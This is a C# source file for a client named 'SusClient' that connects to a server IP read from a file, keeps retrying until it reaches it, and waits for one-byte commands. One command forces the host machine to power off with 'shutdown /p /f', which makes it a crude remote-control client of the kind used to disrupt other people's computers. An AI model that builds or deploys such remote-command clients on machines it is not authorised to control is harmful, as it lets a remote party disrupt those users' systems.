using System;
using System.Diagnostics;
using CoreSus.IP;
using CoreSus.Nodes;

namespace SusClient
{
    public class MainClient
    {
        public MainClient()
        {
            Begin();
        }

        private void Begin() //Handles the startup routine
        {
            user = new Client();

            Console.Write("Creating client socket...");

            var manager = new IPManager("files/ip", "ip.txt");
            user.CreateSocket //Creates the socket
                (
                    user.ConvertToAddress //Converts the string ip to an IPAddress
                        (
                            manager.GetIP() //Gets the ip from the ip file
                        ),
                    11345 //The port number
                );
            
            Console.Write("Done!\n");
        }

        public void ConnectToServer()
        {
            Console.Write("Finding server...");
            while (!user.Connect())
            {
                System.Threading.Thread.Sleep(10000);
            }
            Console.Write("Done!\n");
        }

        public void BeginCommandProcessing()
        {
            Console.WriteLine("Waiting for command: ");
            byte[] latestCommand = new byte[1];
            latestCommand[0] = 0b00000000;

            while(latestCommand[0] != 0b00000001) //Quits taking commands once 'quit' command has been issued
            {
                if(latestCommand[0] == 0b00000010) //Executes the 'shutdown' command
                {
                    Console.WriteLine("'shutdown' command has been issued!");
                    ShutdownCommand(); //Runs the shutdown routine
                }
                else if(latestCommand[0] == 0b00000011) //Checks if the command is disconnect
                {
                    Console.WriteLine("'disconnect' command has been issued!");
                    break;
                }

                latestCommand = user.Receive(1); //Gets the latest command
                Console.WriteLine("'{0}' has been received!", latestCommand[0]);
            }
            Console.WriteLine("Command loop has exited!");
            if(latestCommand[0] == 0b00000011)
            {
                DisconnectCommand();
            }
        }

        private void ShutdownCommand() //Handles the shutdown command
        {
            Process.Start("shutdown", "/p /f"); //Creates a new cmd that executes the shutdown command
        }

        private void DisconnectCommand() //Handles the disconnect command
        {
            while(user.Send(0b11111111)) //Waits until the server has gone offline
            {
                System.Threading.Thread.Sleep(1000);
            }

            user.Cleanup(); //Cleans up the socket

            Begin(); //Recreate the user for future use
            ConnectToServer(); //Tries to find a new server
            BeginCommandProcessing(); //Begins a new command chain
        }
        private void AnnoyCommand()
        {
            Process.Start("cmd.exe", "echo \"sauce\"");
        }

        private Client user; //The main client
    }
}
